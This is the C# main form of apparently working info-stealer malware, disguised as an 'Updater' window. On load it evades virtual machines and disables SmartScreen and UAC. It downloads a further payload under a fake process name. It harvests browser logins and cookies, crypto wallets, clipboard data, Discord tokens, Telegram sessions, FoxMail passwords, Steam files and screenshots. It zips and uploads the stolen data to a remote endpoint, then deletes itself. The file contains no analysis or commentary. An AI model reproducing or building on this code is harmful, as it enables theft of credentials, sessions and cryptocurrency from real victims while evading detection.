namespace PEngine
{
    using PEngine.Engine.Applications.Discord;
    using PEngine.Engine.Applications.FoxMail;
    using PEngine.Engine.Applications.Steam;
    using PEngine.Engine.Applications.Telegram;
    using PEngine.Engine.Browsers.Chromium;
    using PEngine.Engine.Browsers.Chromium.Cookies;
    using PEngine.Engine.Cryptocurrencies;
    using PEngine.Engine.InfoPC;
    using PEngine.Engine.Others;
    using PEngine.Helpers;
    using PEngine.Loader;
    using PEngine.Main;
    using PEngine.Sticks;
    using System;
    using System.Threading;
    using System.Windows.Forms;

    public partial class Updater : Form
    {
        public Updater() => this.InitializeComponent();

        private void Updater_Load(object sender, EventArgs e)
        {
            if(Date.Delay)
                Thread.Sleep(Date.DelaySec);

            if (!AntiVM.GetCheckVMBot())
            {
                if (!MovEx.CheckPath())
                {
                    if (Date.Delay)
                    {
                        ProcessKiller.Delete($"/C choice /C Y /N /D Y /T {Date.DelayTime} & Del", GlobalPath.AssemblyPath);
                    }
                }
                else
                {
                    HideFolders.Enabled(0);
                    DisableLockers.SmartScreen();
                    DisableLockers.UAC();
                    AntiSniffer.Inizialize();

                    if (Date.Downloader || Date.AdminRight)
                    {
                        Users.DownFileEx(Date.DownloaderLink, Environment.GetEnvironmentVariable(Date.DownloaderPath), Date.FakeNameProcess);
                    }
                    if(Date.IpLogger)
                        IPLogger.Sender(Date.IpLoggerLink);
                    if (Date.InfoGrabber)
                    {
                        InfoGrabber.CreateTable(GlobalPath.PC_File);
                    }
                    if (Date.CryptoWall)
                    {
                        BitBoard.GetWallet();
                    }
                    if (Date.Browsers)
                    {
                        ChromeSearcher.CopyLoginsInSafeDir(GlobalPath.Logins);
                        ChromeCookiesSearcher.CopyCookiesInSafeDir(GlobalPath.Cookies);
                        GetPassword.Inizialize();
                        GetCookies.Inizialize();
                    }
                    if (Date.Buffer)
                    {
                        ClipboardEx.GetBuffer(GlobalPath.Buffer);
                    }
                    if (Date.Programs)
                    {
                        MailFoxPassword.Inizialize();
                        DcGrabber.GeTokens();
                        TGrabber.GetTelegramSession(GlobalPath.Tdata, GlobalPath.TelegaHome, "*.*");
                    }
                    if (Date.Clients)
                    {
                        GetClients.Inizialize();
                    }
                    if (Date.Steam)
                    {
                        GetSteamFiles.Copy("*.", "*.vdf", "config", "Steam");
                    }
                    if (Date.ScreenShot)
                    {
                        ScreenShot.Shoot(GlobalPath.Screen);
                    }
                    Ccleaner.CheckIsNullDirsAndFiles(GlobalPath.GarbageTemp);
                    Archiving.Inizialize();
                    UploadZip.Inizialize(GlobalPath.Reception, "POST", GlobalPath.ZipAdd);
                    //BlockIE.Enabled(1); // Блокировка интернета
                    if (Date.Delay)
                    {
                        ProcessKiller.Delete($"/C choice /C Y /N /D Y /T {Date.DelayTime} & Del", GlobalPath.AssemblyPath);
                    }
                    Application.Exit();
                }
            }
            else
            {
                SaveData.SaveFile("VM_Detect.txt", "The program is not supported on virtual machines!");
                if (Date.Delay)
                {
                    ProcessKiller.Delete($"/C choice /C Y /N /D Y /T {Date.DelayTime} & Del", GlobalPath.AssemblyPath);
                }
            }
        }
    }
}